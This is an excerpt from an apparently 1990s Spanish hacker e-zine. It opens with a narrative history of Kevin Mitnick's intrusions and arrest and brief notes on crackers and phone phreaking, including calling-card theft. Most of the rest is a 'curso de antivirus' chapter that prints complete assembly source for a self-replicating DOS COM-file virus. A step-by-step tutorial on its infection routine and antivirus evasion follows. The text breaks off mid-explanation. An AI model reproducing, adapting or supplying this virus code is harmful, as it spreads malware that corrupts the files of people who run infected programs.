 su caso encontro que su telefono fue desconectado y que en la compañia
 telefonica no habia ningun registro de el.

 Sus objetivos iban creciendo a cada paso y en 1982 entro ilegalmente, via
 modem, a la computadora del North American Air Defense Command en Colorado.
 Antes de entrar altero el programa encargado de rastrear la procedencia de
 las llamadas y desvio el rastro de su llamada a otro lugar. El FBI, creyendo
 que habia hallado a Mitnick, allano la casa de unos inmigrantes que estaban
 viendo television.

 Un año mas tarde fue arrestado de nuevo cuando era estudiante de la
 Universidad del Sur de California. En esta ocasion entro ilegalmente a
 ARPAnet (la predecesora de Internet) y trato de accesar a la computadora del
 Pentagono. Lo sentenciaron a seis meses de carcel en una prision juvenil en
 California.

 En 1987, luego de tratar de poner su vida en orden, cayo ante la tentacion y
 fue acusado, en Santa Cruz California, de invadir el sistema de la compañia
 Microcorp Systems. Lo sentenciaron a tres años de libertad condicional y
 luego de la sentencia su expediente desaparecio de la computadora de la
 policia local.

 Luego busco trabajo en lo que mejor sabia hacer y solicito empleo en el
 Security Pacific Bank como encargado de la seguridad de la red del banco. El
 banco lo rechazo por sus antecedentes penales y Mitnick falsifico un balance
 general del banco donde se mostraban perdidas por 400 millones de dolares y
 trato de enviarlo por la red. Afortunadamente el administrador de la red
 detuvo el balance antes de que viera la luz.

 Ese mismo año inicio el escandalo que lo lanzo a la fama. Durante meses
 observo secretamente el correo electronico de los miembros del departamento
 de seguridad de MCI Communications y Digital Equipment Corporation para
 conocer como estaban protegidos las computadoras y el sistema telefonico de
 ambas compañias.

 Luego de recoger suficiente informacion se apodero de 16 codigos de seguridad
 de MCI y junto a un amigo, Lenny DiCicco, entraron a la red del laboratorio
 de investigaciones de Digital Corporation, conocida como Easynet. Ambos
 Hackers querian obtener una copia del prototipo del nuevo sistema operativo
 de seguridad de Digital llamado VMS. El personal de seguridad de Digital se
 dio cuenta inmediatamente del ataque y dieron aviso al FBI, y comenzaron a
 rastrear a los hackers.

 Mitnick fue un mal complice y, a pesar de que habian trabajado juntos, trato
 de echarle toda la culpa a DiCicco haciendo llamadas anonimas al jefe de
 este que trabajaba en una compañia de software como tecnico de soporte.
 Lleno de rabia y frustracion DiCicco le confeso todo a su jefe que los
 denuncio a Digital y al FBI.

 Mitnick fue arrestado en 1988 por invadir el sistema de Digital Equipment.
 La empresa acuso a Mitnick y a DiCicco ante un juez federal de causarles
 daños por 4 millones de dolares en el robo de su sistema operativo. Fue
 declarado culpable de un cargo de fraude en computadoras y de uno por
 posesion ilegal de codigos de acceso de larga distancia.

 Adicional a la sentencia el fiscal obtuvo una orden de la corte que prohibia
 a Mitnick el uso del telefono en la prision alegando que el prisionero podria
 obtener acceso a las computadoras a traves de cualquier telefono. A peticion
 de Mitnick el juez lo autorizo a llamar unicamente a su abogado, a su esposa,
 a su madre y a su abuela y solo bajo supervision de un oficial de la prision.

 Este caso produjo revuelo en los Estados Unidos, no solo por el hecho
 delictivo sino por la tactica que utilizo la defensa. Su abogado convencio
 al juez que Mitnick sufria de una adiccion por las computadoras equivalente
 a la de un drogadicto, un alcoholico o un apostador. Gracias a esta maniobra
 de la defensa Mitnick fue sentenciado a solo un año de prision y al salir de
 alli debia seguir un programa de seis meses para tratar su "adiccion a las
 computadoras". Durante su tratamiento le fue prohibido tocar una computadora
 o un modem y llego a perder mas de 45 kilos.

 Para 1991 ya era el Hacker que habia ocupado la primera plana del New York
 Times y uno de sus reporteros, John Markoff, decidio escribir un libro de
 estilo Cyberpunk narrando las aventuras de Mitnick. Al parecer a Mitnick no
 le gusto el libro ya que luego de salir a la venta, la cuenta en Internet
 de Markoff fue invadida, cambiando su nivel de acceso, de manera de que
 cualquier persona en el mundo conectada a Internet podia ver su correo
 electronico.

 En 1992, y luego de concluir su programa, Mitnick comenzo a trabajar en una
 agencia de detectives. Pronto se descubrio un manejo ilegal en el uso de la
 base de datos y fue objeto de una investigacion por parte del FBI quien
 determino que habia violado los terminos de su libertad condicional.
 Allanaron su casa pero habia desaparecido sin dejar rastro alguno. Ahora
 Mitnick se habia convertido en un Hacker profugo.

 El fiscal no estaba tan equivocado cuando pidio la restriccion del uso del
 telefono. Tambien en 1992, el Departamento de Vehiculos de California
 ofrecio una recompensa de 1 millon de dolares a quien arrestara a Mitnick
 por haber tratado de obtener una licencia de conducir de manera fraudulenta,
 utilizando un codigo de acceso y enviando sus datos via fax.

 El Fin

 Luego de convertirse en profugo de la justicia cambio de tactica y concluyo
 que la mejor manera de no ser rastreado era utilizando telefonos celulares.
 De esta manera podria cometer sus fechorias y no estar atado a ningun lugar
 fijo. Para ello necesitaba obtener programas que le permitieran moverse con
 la misma facilidad con que lo hacia en la red telefonica.

 Luego de varios intentos infructuosos, en cuanto a calidad de informacion,
 se encontro con la computadora de Tsutomu Shimomura la cual invadio en la
 Navidad de 1994. Shimomura, fisico computista y experto en sistemas de
 seguridad del San Diego Supercomputer Center, era ademas un muy buen Hacker,
 pero era de los "chicos buenos", ya que cuando hallaba una falla de seguridad
 en algun sistema lo reportaba a las autoridades, no a otros Hackers.

 Shimomura noto que alguien habia invadido su computadora en su ausencia,
 utilizando un metodo de intrusion muy sofisticado y que el nunca antes habia
 visto. El intruso le habia robado su correo electronico, software para el
 control de telefonos celulares y varias herramientas de seguridad en
 Internet. Alli comenzo la cuenta regresiva para Mitnick. Shimomura se
 propuso como orgullo personal atrapar al Hacker que habia invadido su
 privacidad.

 Hacia finales de enero de 1995, el software de Shimomura fue hallado en una
 cuenta en The Well, un proveedor de Internet en California. Mitnick habia
 creado una cuenta fantasma en ese proveedor y desde alli utilizaba las
 herramientas de Shimomura para lanzar ataques hacia una docena de
 corporaciones de computadoras, entre ellas Motorola, Apple y Qualcomm.

 Shimomura se reunio con el gerente de The Well y con un tecnico de Sprint
 (proveedor de servicios telefonicos celulares) y descubrieron que Mitnick
 habia creado un numero celular fantasma para accesar el sistema. Luego de
 dos semanas de rastreos determinaron que las llamadas provenian de Raleigh,
 California.

 Al llegar Shimomura a Raleigh recibio una llamada del experto en seguridad
 de InterNex, otro proveedor de Internet en California. Mitnick habia
 invadido otra vez el sistema de InterNex, habia creado una cuenta de nombre
 Nancy, borrado una con el nombre Bob y habia cambiado varias claves de
 seguridad incluyendo la del experto y la del gerente del sistema que posee
 los privilegios mas altos. De igual manera Shimomura tenia informacion sobre
 la invasion de Mitcnick a Netcom, una red de base de datos de noticias.

 Shimomura se comunico con el FBI y estos enviaron a un grupo de rastreo por
 radio. El equipo de rastreo poseia un simulador de celda, un equipo
 normalmente utilizado para probar telefonos celulares pero modificado para
 rastrear el telefono de Mitnick mientras este esta encendido y aunque no
 este en uso. Con este aparato el celular se convertiria en un transmisor sin
 que el usuario lo supiera.

 A medianoche terminaron de colocar los equipos en una Van y comenzo la
 busqueda de la señal, porque eso era lo que querian localizar; no buscaban a
 un hombre porque todas las fotos que tenian eran viejas y no estaban seguros
 de su aspecto actual, el objetivo de esa noche era determinar el lugar de
 procedencia de la señal. Ya para la madrugada localizaron la señal en un
 grupo de apartamentos pero no pudieron determinar en cual debido a
 interferencias en la señal.

 Mientras esto ocurria la gente de InterNex, The Well y Netcom estaban
 preocupados por los movimientos que casi simultaneamente Mitnick hacia en
 cada uno de estos sistemas. Cambiaba claves de acceso que el mismo habia
 creado y que tenian menos de 12 horas de creadas, utilizando codigos
 extraños e ironicos como no,panix, fukhood y fuckjkt. Estaba creando nuevas
 cuentas con mayores niveles de seguridad como si sospechara que lo estaban
 vigilando.

 El FBI, Shimomura y el equipo de Sprint se habian reunido para planificar la
 captura. Shimomura envio un mensaje codificado al buscapersonas del
 encargado en Netcom para advertirle que el arresto se iba a realizar al dia
 siguiente, 16 de Febrero.
 Shimomura envio el mensaje varias veces por equivocacion y el encargado
 interpreto que Mitnick ya habia sido arrestado adelantandose a realizar una
 copia de respaldo de todo el material que Mitnick habia almacenado en Netcom
 como evidencia y borrando las versiones almacenadas por Mitnick. Habia que
 realizar el arresto de inmediato, antes de que Mitnick se diera cuenta de
 que su informacion habia sido borrada.

 Cuando faltaban minutos para dar la orden el simulador de celdas detecto una
 nueva señal de transmision de datos via celular y simultanea a la de
 Mitnick, muy cerca de esa zona. Algo extraño estaba haciendo Mitnick con las
 lineas celulares, Shimomura trato de advertirle al agente del FBI pero ya
 todo estaba en manos de ellos, Shimomura de ahora en adelante no era mas que
 un espectador privilegiado. El FBI no pensaban hacer una entrada violenta
 porque no creian que Mitnick estuviera armado, pero tenian que actuar muy
 rapido porque sabian el daño que este hombre podia causar en un solo minuto
 con una computadora. Se acercaron lentamente hasta la entrada del apartamento
 de Mitnick y anunciaron su presencia, si no les abrian la puerta en cinco
 segundos la echarian abajo. Mitnick abrio la puerta con toda calma y el FBI
 procedio a arrestarlo y a decomisar todo el material pertinente discos,
 computador, telefonos celulares, manuales, etc.

 De regreso a su hotel Shimomura decide chequear la contestadora telefonica
 de su residencia en San Diego. Se quedo en una pieza cuando escucho la voz
 de Mitnick quien le habia dejado varios mensajes con acento oriental en tono
 de burla. El ultimo de estos mensajes lo habia recibido ocho horas despues
 de que Mitnick habia sido arrestado y antes de que la prensa se hubiera
 enterado de todo el asunto. Como se realizo esa llamada aun es un misterio
 al igual que el origen y objetivo de la segunda señal de Mitnick.

 Este persistente hacker actualmente esta siendo juzgado y enfrenta dos
 cargos federales, uso ilegal de equipos de acceso telefonico y fraude por
 computadoras. Puede ser condenado por hasta 35 años y a pagar una multa de
 hasta medio millon de dolares. Mitnick tambien es sospechoso de robar el
 software que las compañias telefonicas piensan usar para todo tipo de
 procesos, desde la facturacion hasta el seguimiento del origen de una llamada
 pasando por la decodificacion de las señales de los telefonos celulares para
 preservar su privacidad.

                                      El vuelo final

     Todos los cargos bajo los cuales
     ha sido acusado Kevin Mitnick podrian
     suponerle mas de doscientos años
     de prision si es declarado culpable

     "No culpable" alcanzo a declararse Kevin Mitnick ante el Gran Jurado de
     California, que el pasado 30 de septiembre lo acuso de 25 cargos por los
     cuales podria ser condenado a mas de doscientos años de presidio.

     "Esta acusacion revela el amplio daño que Mitnick causo mientras era un
     fugitivo de la justicia. Los delitos por computadora permiten a
     sofisticados criminales causar estragos alrededor del mundo usando solo
     una computadora y un modem como sus armas. Queremos con esta acusacion
     dar un paso adelante en los esfuerzos federales por perseguir y capturar
     a los hackers" dijo la fiscal encargada del caso, Nora Manella. Los
     cargos por los que fue acusado Mitnick y su ayudante Lewis Depayne, de
     36 años, incluyen el robo de software, fraude electronico, daño a las
     computadoras de la Universidad del Sur de California, robo de archivos
     electronicos e intercepcion de mensajes de correo electronico. Entre las
     compañias afectadas por las actividades del llamado "Condor" se cuentan
     Motorola, Nokia, Fujitsu y Nec.

     Se supone que los daños causados por Mitnick en los dos años y medio
     durante los cuales fue un fugitivo suman millones de dolares,
     especialmente por el software robado y las inversiones que debieron
     realizar las empresas para proteger sus sistemas. El asistente del
     fiscal David Schindler dijo que Mitnick -quien actualmente tiene 33 años-
     seria probablemente sentenciado a "muchos años" si es encontrado
     culpable, negandose, sin embargo, a ser mas especifico, bajo el argumento
     de que se trata de un area legal muy nueva. Todos los cargos bajo los
     cuales ha sido acusado  Mitnick podrian suponerle mas de doscientos años
     de prision si es declarado culpable de todos ellos.

     Ya en abril de este año el famoso hacker habia sido declarado culpable
     por un jurado de Carolina del Norte por el uso del quince numeros de
     telefonos celulares robados para llamar a bases de datos electronicas.
     Igualmente se le condeno  por haber violado el regimen de libertad
     condicional al que estaba sometido luego de ser encontrado culpable de
     penetrar ilegalmente en sistemas de informacion de corporaciones de
     informatica.

     Mitnick: hacker, cracker y phone phreaker

     La definicion de un cracker es alguien que trata de violar el acceso a
     un sistema adquiriendo passwords. La mayoria de los crackers son
     adolescentes nada bondadosos y que buscan dar sus golpes destruyendo o
     alterando la data de un sistema. Tienden a unirse en grupos muy pequeños,
     secretos y cerrados al contrario de los inmensos, abierto y
     policulturales hackers.

     Se espera que un verdadero hacker haga algo de crackin jugueton y
     conozca muchas de las tecnicas basicas, pero cualquiera que pase de la
     etapa de larva puede caer en la tentacion y, debido a su creciente deseo
     de realizar algo por razones inmediatas, benignas y practicas, no vea
     nada de malo en invadir cierta seguridad y privacidad para poder lograr
     una meta.

     Para el cracker el invadir un sistema no requiere de misteriosos estados
     de iluminacion mental, pero si mucha persistencia y la testaruda
     repeticion de trucos bien conocidos en los puntos debiles de un sistema,
     tratan de descubrir informacion clasificada hurgando al azar y con ciega
     persistencia.

     Suele decirse que los crackers son solo hackers mediocres y que su nivel
     de educacion e inteligencia sobre un sistema es menor.

     Los phone phreaker son los mas famosos en los medios de comunicacion por
     los desastres que han hecho a traves de los años. En los años 60 ya
     existian los Phone Phreaks y la gran victima era AT&T. Uno de los mas
     famosos Phone Phreaks de esa epoca era John Draper, alias Captain Crunch
     (http://www.fc.net/phrack.html). El descubrio que modificando una caja
     de cereal podia producir el silbido que simulaba un tono de 2600 Hz para
     desbloquear el acceso a una troncal y poder hacer llamadas
     internacionales gratis.

     Hace algun tiempo el hacer phreaking fue una actividad semi-respetable
     dentro de la comunidad hacker; habia un  acuerdo de caballeros donde el
     hacer phreaking era bien visto como juego intelectual y como una forma
     de exploracion, pero el robo de servicios era tabu. La modernizacion de
     las redes hizo necesario que los phreakers utilizaran tecnicas menos
     eticas, como robar numeros de calling cards: los obtenian colocandose
     cerca de algun telefono publico y memorizando el numero de tarjeta que
     marcaba un usuario descuidado, una vez obtenido el numero y la clave la
     informacion era esparcida de tal manera que en un caso se llegaron a
     realizar 600 llamadas internacionales en dos minutos antes de que los
     operadores de seguridad del sistema la cancelaran.


RareGaZz@Bigfoot.com

[[[[[[[[[[[[[[[[[ZeD-wOrLd-EzInE numero 4]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]


          ææææææææææææææææææææææææææææææææææææææææ
          æ segunda parte del curso de antivirus æ
          ÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆ


 Segundo cap¡tulo: INFECCION APPENDING DE COMS. VIRUS NO RESIDENTE

 ******************************************************************************
  Disposici¢n Legal:

>   Yo, el autor, declino toda responsabilidad civil y/o legal que discurra
>  de la utilizaci¢n fraudulenta de esta informaci¢n. El responsable £nico
>  y £ltimo ser  el lector si decide usarla para dichos fines.

                                                        El autor:
                                                        Manuel Llorens.
 ******************************************************************************

 Bueno, pues aqu¡ ten‚is el infector de COMs:

=== ASM Begin 'v020.asm'===
; El presente listado es un virus de 225 bytes. Es capaz de infectar
; COMs que se encuentren en el directorio en el que se ejecuta. Buscar 
; hasta encontrar un COM apropiado. No reinfecta. La marca de infecci¢n
; es 0fe0h en el £ltimo word. No infectar  los archivos protegidos
; contra escritura. Preserva la fecha y la hora del archivo original.
; Para ensamblar: TASM virus, TLINK /t virus
; Patuel

        ;** Longitud del virus **
virLENGTH       equ offset virEND-offset virBEGIN

        ;** T¡pica plantilla de COM **
C_SEG           segment 'CODE'
                org     100h
assume          cs:C_SEG,ds:C_SEG,es:C_SEG

        ;** Aqu¡ comienza el host, el falso host es NOP, NOP, NOP, INT 20h **
host:           jmp     far ptr entry   ; Saltamos al c¢digo v¡rico

        ;** Aqu¡ vendr  el resto del programa host **
                int     20h             

        ;** Aqu¡ comienza el virus en s¡ **
virBEGIN        label   byte

        ;** Calculamos el ë-offset
entry:          int     68h
                call    near ptr start
start:          pop     bp              ; BP = offset de start
                sub     bp,offset start ; La primera vez obtenemos BP = 0

        ;** Restauramos los 3 primeros bytes del host **
                mov     di,100h         ; Principio del host
                push    di              ; Dejamos 100h en la pila
                lea     si,buffer+bp    
                movsw                   ; Ahorramos bytes al no cargar CX
                movsb

        ;** Ahora creamos un nuevo DTA al final del virus **
                mov     ah,1ah          ; Establecer DTA en DS:DX
                lea     dx,virEND+bp
                int     21h

        ;** Buscamos un archivo para infectar **
                mov     ah,4eh          ; Buscar primer archivo que coincida
                lea     dx,path+bp      ; con la cadena en DS:DX
                xor     cx,cx           ; S¢lo archivos normales
busqueda:       int     21h             ; (no infectar  los write protected)
                jc      salir           ; salir si hubo error 

        ;** Abrimos el archivo que haya encontrado **
                mov     ax,3d02h        ; Abrir fichero en DS:DX el lec/esc
                                        ; En el offset 1eh de la DTA est 
                                        ; el nombre del archivo
                lea     dx,virEND+bp+1eh
                int     21h
                jc      salir           ; salir si hubo error
                xchg    bx,ax           ; metemos en BX el handle

        ;** Guardamos los 3 primeros bytes del host **
                mov     ah,3fh          ; Leer CX bytes desde BX hasta DS:DX
                mov     cx,3
                lea     dx,buffer+bp    ; Los metemos en el buffer
                int     21h

        ;** Movemos el puntero al final del fichero **
sigue:          mov     ax,4202h        ; Mover el puntero la cantidad CX:DX
                mov     cx,0ffffh       ; desde el final del archivo
                mov     dx,-2        
                int     21h

        ;** Leemos el £ltimo word del fichero **
                mov     ah,3fh          ; Leer desde BX hasta DS:DX
                mov     cx,2            ; Leemos 2 bytes
                lea     dx,buffer2+bp   ; Los metemos en el buffer
                int     21h

        ;** Miramos si el archivo ya estaba infectado **
                cmp     word ptr buffer2+bp,0e00fh
                je      otro

        ;** Averiguamos la longitud del archivo **
                mov     ax,4201h        ; Mover el puntero la cantidad CX:DX
                xor     cx,cx           ; desde la posici¢n actual
                xor     dx,dx
                int     21h             ; Nos devuelve en DX:AX la longitud

        ;** Comprobamos si el COM tiene un tama¤o 'err¢neo' **
                or      dx,dx           ; El COM es demasiado grande
                jne     otro
                cmp     ax,0ffffh-VirLENGTH
                jnb     otro
                cmp     ax,10h          ; El COM es demasiado peque¤o
                jb      otro

        ;** Guardamos la longitud del host **
                sub     ax,3            ; Longitud menos salto inicial
                mov     word ptr long+bp,ax

        ;** A¤adimos el virus al final del archivo **
                mov     ah,40h          ; Escribir CX bytes desde DS:DX a BX
                mov     cx,VirLENGTH    
                lea     dx,VirBEGIN+bp  ; Desde el comienzo del virus
                int     21h

        ;** Movemos el puntero al principio del archivo **
                mov     ax,4200h        ; Mover el puntero la cantidad CX:DX
                xor     cx,cx           ; desde el comienzo del archivo
                xor     dx,dx
                int     21h

        ;** Escribimos el salto **
                mov     ah,40h          ; Escribir CX bytes desde DS:DX a BX
                mov     cx,3
                lea     dx,salto+bp     ; Reconstrucci¢n del salto
                int     21h

        ;** Restauramos la fecha y la hora originales **
                call    fecha

        ;** Cerramos el archivo **
                mov     ah,3eh          ; Cerrar el handle en BX
                int     21h      

        ;** Restauramos los registros de segmento **
salir:          mov     ax,cs
                mov     ds,ax
                mov     es,ax

        ;** Volvemos a poner el DTA original **                
                mov     ah,1ah          ; Establecer DTA en DS:DX
                mov     dx,80h
                int     21h              

        ;** Saltamos a 100h **
                ret

        ;** Cerramos el archivo **
otro:           mov     ah,3eh          ; Cerrar el handle en BX
                int     21h

        ;** Como el arhivo ya estaba infectado buscamos el siguiente **
                mov     ah,4fh          ; Buscar siguiente archivo
                jmp     busqueda

        ;** Restauramos la fecha y la hora que est n a£n en el DTA **
fecha:          mov     ax,5701h        ; Establecer fecha y hora de BX
                mov     cx,word ptr [virEND+bp+16h]
                mov     dx,word ptr [virEND+bp+18h]
                int     21h
                ret
                                
        ;** Archivos a buscar en forma de ASCIIZ **
path    db      '*.COM',0
        ;** Reconstrucci¢n del salto que ir  al comienzo del archivo **
salto   db      0e9h
long    dw      ?
        ;** Aqu¡ guardamos los 3 primeros bytes del host **
buffer  db      3 dup(90h)
        ;** Aqu¡ guardamos los 2 £ltimos bytes del host **
buffer2 db      2 dup(?)
        ;** Marca de archivo infectado **
marca   db      0fh,0e0h
        ;** Aqu¡ termina el virus **
virEND          label   byte

C_SEG           ends
                end     host
=== ASM end 'v020.asm'===

 Para todos aquellos para los que este sea el primer contacto con el
listado de un virus, la compresi¢n de este ASM ser  fundamental. Por
ello es muy importante que pregunt‚is todo lo que no entend is del
mismo. Voy a intentar explicarlo lo mejor posible, pero es un poco
liosillo, as¡ que probad por vuestra cuenta y preguntad ;)

 Lo primero que debo aclarar es que el listado de arriba no es el
listado de un virus sino el listado de un programa infectado por el
virus. Esto siempre se hace as¡ cuando se comienza a escribir un virus.
Se crea un archivo host (anfitri¢n) para el virus lo m s sencillo
posible. En este caso el listado ensamblador del host es:

 90h    nop             ; No hacer nada
 90h    nop             ; No hacer nada
 90h    nop             ; No hacer nada
 cd20h  int     20h     ; Salir

 Supongamos entonces que ten¡amos este archivo y que lo hemos infectado
a mano. La infecci¢n se produce del siguiente modo:

 Sustituimos los 3 primeros bytes del archivo host por un salto al final
del mismo. A¤adimos el c¢digo v¡rico al final del archivo. El c¢digo
v¡rico restaura los 3 primeros bytes del host en momoria, ejecuta su
c¢digo y devuelve el control al host. De este modo el host no se entera
de que est  infectado, dado que se ejecuta sin 'molestia'. La £nica
excepci¢n a esta regla supone que el COM se abra a s¡ mismo como archivo
para leer datos y que lo haga leyendo desde una posici¢n relativa al final
del fichero, eso o que el COM se autochequee. Esto lo podemos evitar
mediante un virus stealth, pero eso lo dejamos para el final del
cap¡tulo ;)

 Vamos paso por paso a ver qu‚ es lo que hace el virus.

 Lo primero que tenemos en el listado es el salto al c¢digo v¡rico.
Estamos viendo el listado de un programa infectado, as¡ que los tres
bytes que pertenec¡an al host est n guardados en 'buffer' (90,90,90h)
con el fin de poder restaurarlos m s adelante.

 El 'jmp' salta hasta el c¢digo v¡rico, que comienza en 'entry'. Todo lo
que queda entre ambas direcciones es parte del host y no lo tocamos para
nada. Como se puede comprender r pidamente, la direcci¢n de 'entry'
cambiar  seg£n lo grande que sea el host. As¡ que lo siguiente que
hacemos es averiguar cual es esa direcci¢n. Esto es necesario dado que
los offsets de las variables que usa el virus ('buffer' por ejemplo) los
ha calculado el ensamblador respecto al host de 5 bytes, pero cuando el
host sea mayor las variables tendr n offsets mayores, tanto mayores
cuanto mayor sea el host. Para eso hacemos el call que comienza en
entry (olvidaros del int 68h de momento).

 tenemos esto:

 entry:         call    near ptr start
 start:         pop     bp
                sub     bp,offset start

 Como todos sab‚is el call salta a start dejando en la pila la direcci¢n
(s¢lo el offset por ser un salto near) de la instrucci¢n siguiente al
call, que en este caso es el propio start. De ese modo cuando hacemos el
pop obtenemos en bp el offset real de start y dejamos la pila 'limpia'
 A continuaci¢n le restamos el offset de start en el momento de la
compilaci¢n. De ese modo si estamos ejecutando este listado ambos
offsets ser n iguales y bp ser  0. Este valor de bp es lo que se conoce
como ë-offset. Cuando el host sea mayor el valor obtenido mediante el
pop ser  mayor, pero lo que le restamos sigue siendo un valor fijo. Como
es un proceso algo complicadillo vamos a verlo m s en detalle:

 0105   e80000   call   0108    (deja 0108 en la pila)
 0108   5d       pop    bp      (bp=0108)
 0109   81ed0301 sub    bp,108  (bp=0)

 En un host diferente:

 0205   e80000   call   0208    (deja 0208 en la pila)
 0208   5d       pop    bp      (bp=0208)
 0209   81ed0301 sub    bp,108  (bp=0100)

 Es decir, 100h es la diferencia de bytes entre ambos hosts, y es lo que
ha aumentado el offset de las variables internas del virus ;)

 A partir de ese punto todas las variables del virus las deberemos usar
de la forma variable+bp.

 Resumiendo, hasta aqu¡ tenemos lo siguiente:

                 ÚÄ  salto                ÚÄ> inicio del host
              A) ³   resto del host    B) ³   resto del host
                 ÀÄ> c¢digo v¡rico        ÀÄ  C¢digo v¡rico

 Vamos a continuar con el c¢digo del virus. Como al final del c¢digo
v¡rico tendremos que saltar a la direcci¢n 100h (comienzo del c¢digo
ejecutable). Para ello dejamos 100h en la pila y al final de virus
hacemos un simple ret. Es una forma de despistar a algunos antivirus
heur¡sticos, de modo que no crean que el virus devuelve el control al
host. Esto lo hacemos mediante:

         mov    di,100h
         push   di

 Ahora restauramos los 3 primeros bytes del host (en memoria). Para ello
como DS y ES ya los tenemos cargados y di es justo 100h porque lo
acabamos de cargar s¢lo tenemos que cargar SI con el offset de buffer:

        lea     si,buffer+sp

 y restauramos los tres bytes con

        movsw   word ptr DS:SI -> word ptr ES:DI SI=SI+2, DI=DI+2
        movsb   byte ptr DS:SI -> byte ptr ES:DI SI=SI+1, DI=DI+1

 Si ahora pusi‚semos un ret el virus no har¡a nada, pero funcionar¡a
perfectamente. As¡ que ahora pasamos al c¢digo realmente reproductivo.

 Lo que viene a continuaci¢n involucra al DTA, as¡ que vamos a ver el
DTA en detalle. El DTA es una estructura que por defecto se sit£a a
partir del offset 80h del segmento del PSP. Es decir si el COM comienza
en 100h pues est  en los 20h bytes anteriores. Esta localizaci¢n
presenta un problemas y es que es la misma que utiliza el DOS para pasar
al COM los par metros que se hayan especificado desde la l¡nea de
comandos. Esto es un problema pues si usamos la DTA por defecto nos
estaremos cargando los par metros y si el host los necesita no los
encontrar ... para ello necesitamos crear otro DTA en una localizaci¢n
distinta. En este caso lo situaremos al final del virus. Para ello
tenemos una funci¢n del DOS:

         mov    ah,1ag
         lea    dx,virEND+bp
         int    21h

 Esto hace que el nuevo DTA sea el indicado por DS:DX. DX lo cargamos
con el final del virus y DS ya est  cargado (lo hace el DOS al pasar el
control al host y nosotros no lo hemos tocado).

 Ahora que tenemos una DTA segura veamos su estructura:

=== TXT begin 'DTA' ===
 HelpPC 2.10           Quick Reference Utility     Copyright 1991 David Jurgens

           DTA - Disk Transfer Area  (partially undocumented)
 
        DTA contains data, of which the first 21 bytes (00-15h) are known
        as being "reserved for DOS use on subsequent find next calls"
 
      Offset Size	   Description
 
        00   byte	attribute of search (undocumented)
        01   byte	drive used in search  (undocumented)
        02  11bytes	search name used (undocumented)
        0D   word	directory entry number (0 based, DOS 3.x+, undoc.)
        0F   word	starting cluster number of current directory
        		zero for root directory	(DOS 3.x+, undocumented)
        11   word	reserved (undocumented)
        13   word	starting cluster number of current directory
        		zero for root directory	(DOS 2.x+, undocumented)
        15   byte	attribute of matching file
        16   word	file time  (see FILE ATTRIBUTES)
        18   word	file date  (see FILE ATTRIBUTES)
        1A   word	file size
        1E 13bytes	ASCIIZ filename and extension in the form NAME.EXT
        		with blanks stripped
 
 
        - fields of DTA change dependent upon function call in progress
        - the DTA cannot span a 64K segment boundary
        - for compatibility with CP/M the default DTA is at offset 80h
          in the PSP;  this area is also used for the command tail. To
          avoid collision, set another DTA (INT 21,1A) or preserve the
          command tail before using FCB function calls
=== TXT end 'DTA' ===

 A nostros s¢lo nos va a interesar los offsets 16, 18 y 1e que son la
hora, la fecha y el nombre del fichero respectivamente. Vamos a seguir
con el virus que m s adelante vermos c¢mo usar estos offsets.
 (El offset 15 que contiene los atributos tambi‚n es interesante si
queremos preservarlos, pero como este virus no los cambia no ser 
necesario).

 Ahora le decimos al DOS que nos busque el primer '*.COM' que encuentre
en el directorio actual. Para ello llamamos a la funci¢n del DOS que
cumple ese cometido:

                mov     ah,4ah
                lea     dx,path+bp
                xor     cx,cx
busqueda:       int     21h
                jc      salir

 Esta funci¢n nos devolver  el carry a uno si no encuentra ning£n
fichero que coincida con la descripci¢n. Si lo encuentre devolver  su
nombre en el offset 1eh del DTA (junto con el resto de los datos en los
respectivos campos). M s adelante si este archivo no nos satisface
(porque ya est‚ infectado por ejemplo) le pediremos al DOS que nos
busque el siguiente archivo que coincida con la descripci¢n. En este
caso la funci¢n a llamar es la 4fh y el proceso es similar, salvo que no
tenemos que decirle el '*.COM' porque el DOS ya lo sabe de antes, de
hecho lo ha guardado en el DTA (offset 02h). Esa es la explicaci¢n del
precedimiento 'otro':

otro:           'Cerramos el fichero'
                mov     ah,4fh
                jmp     busqueda

 Pero antes de decirle que busque otro debemos ver si el archivo que nos
ha pasado el DOS nos satisface. Para ello vemos antes de nada si ya
estaba infectado. Lo cierto es que el virus (por el modo en que est 
construido) seguir¡a funcionando perfectamente aunque un archivo se
infectase numerosas veces, pero con cada infecci¢n su ejecuci¢n ser¡a
m s y m s lenta, y el archivo m s y m s grande, de ah¡ que lo mejor sea
evitar m£ltiples infecciones. Para saber si un archivo est  infectado
acabamos el c¢digo v¡rico en la palabra '0fe0h' (es un virus con
complejos ;) Si el archivo que estamos intentando infectar ya acaba de
ese modo no lo infectamos y llamamos a otro, en caso contrario seguimos.

 Antes de eso tenemos que abrir el archivo en lectura/escritura, guardar
los 3 primeros bytes del archivo a infectar, mover el puntero al final
del archivo y leemos finalmente esos dos £ltimos bytes. Como esta parte
es muy f cil no la detallo, si ten‚is dudas preguntadlo. Pero la verdad
es que con conocer bien la descripci¢n de cada servicio del DOS del que
hace uso el virus es muy f cil seguirle la pista. Los que quer is tener
una buena descripci¢n os recomiendo las Ralph Brown o el HelpPC ;)

 Es MUY importante copiar los 3 primeros bytes del host antes de la
infecci¢n ya que el virus que va a reproducirse es el que est  en
memoria y si no lo copiamos antes el virus que se copiar  tendr  los
tres primeros bytes del host actual, no del host que estamos
infectando... :))

 Comparamos pues los dos £ltimos bytes:

        cmp     word ptr buffer2+bp,0e00fh
        je      otro

 Si el virus no estaba infectado averiguamos su tama¤o. Podemos leerlo
del DTA o pedirle al DOS que nos lo diga, pero ya que tenemos el archivo
abierto y el puntero al final del archivo (lo teniamos al final -2, pero
al leer esos dos bytes se ha quedado al final) tenemos el tama¤o del
virus en DX:AX (el servicio del DOS que mueve el puntero trabaja de ese
modo). Si DX no es 0 entonces el COM ocupa m s de un segmento y no lo
infectamos, si el tama¤o del host m s el del virus es mayor de un
segmento tampoco lo infectamos y finalmente si el virus es demasiado
peque¤o tampoco (as¡ adem s evitamos infectar archivos trampa).

 En caso de que el archivo cumpla con todos los requisitos pasamos a la
infecci¢n propiamente dicha.

 Para ello ya que estamos al final del archivo a infectar lo que hacemos
es a¤adir primero el virus. Antes guardamos el tama¤o del virus -3 ya
que es esta la cantidad que tendr  que saltar el salto que luego
pondremos al principio del nuevo host. Como hemos marcado bien desde el
comienzo el principio, el final y el tama¤o del virus, el proceso es muy
sencillo:

        mov     ah,40h
